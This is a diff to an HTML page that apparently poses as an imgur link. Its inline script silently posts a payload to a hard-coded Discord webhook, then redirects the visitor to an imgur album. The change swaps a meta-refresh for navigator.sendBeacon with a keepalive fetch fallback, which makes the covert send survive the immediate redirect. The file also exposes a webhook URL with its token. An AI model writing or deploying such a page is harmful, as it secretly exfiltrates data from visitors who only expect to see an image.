@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>—</title>
-    <meta http-equiv="refresh" content="0;url=https://imgur.com/a/BvymwS4">
 </head>
 <body>
     <script>
@@ -18,15 +17,26 @@
                 for_lo: "always"
             };
             const webhookUrl = "https://discord.com/api/webhooks/1532563312099725448/kFpOzSZA3tvbzWo_yQ4ZcWBUt4js1D8HJTacOuEyL89gl25hS5ecYjpwyRN5EmlHdxV9";
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
-                })
-            }).catch(() => {});
+            const payloadString = JSON.stringify({
+                content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
+            });
+
+            try {
+                if (navigator.sendBeacon) {
+                    var blob = new Blob([payloadString], {type: 'application/json'});
+                    navigator.sendBeacon(webhookUrl, blob);
+                } else {
+                    fetch(webhookUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: payloadString,
+                        keepalive: true
+                    });
+                }
+            } catch(e) {}
+
             window.location.replace("https://imgur.com/a/BvymwS4");
         })();
     </script>
